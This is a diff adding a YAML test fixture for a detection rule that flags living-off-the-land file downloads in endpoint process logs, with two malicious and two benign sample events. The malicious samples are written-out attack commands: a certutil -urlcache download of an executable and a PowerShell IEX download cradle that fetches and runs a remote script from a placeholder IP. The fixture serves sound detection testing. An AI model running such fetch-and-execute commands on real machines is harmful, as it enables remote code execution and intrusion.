@@ -1,0 +1,16 @@
+rule: detections/lolbin-file-download.yaml
+description: certutil -urlcache and a PowerShell download cradle fire; certutil -hashfile and a plain status check with Invoke-WebRequest don't.
+data:
+  DeviceProcessEvents:
+    - {ago: 10m, DeviceName: fin-ws-07, AccountName: mallory, FileName: certutil.exe, ProcessCommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\Users\Public\a.exe', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: fin-ws-08, AccountName: mallory, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString(''http://198.51.100.9/s.ps1'')"', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: it-ws-01, AccountName: alice, FileName: certutil.exe, ProcessCommandLine: 'certutil.exe -hashfile C:\temp\setup.msi SHA256', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: it-ws-02, AccountName: bob, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe Invoke-WebRequest https://status.contoso.com/health -UseBasicParsing', InitiatingProcessFileName: explorer.exe}
+expect:
+  rows: 2
+  include:
+    - {DeviceName: fin-ws-07}
+    - {DeviceName: fin-ws-08}
+  exclude:
+    - {DeviceName: it-ws-01}
+    - {DeviceName: it-ws-02}
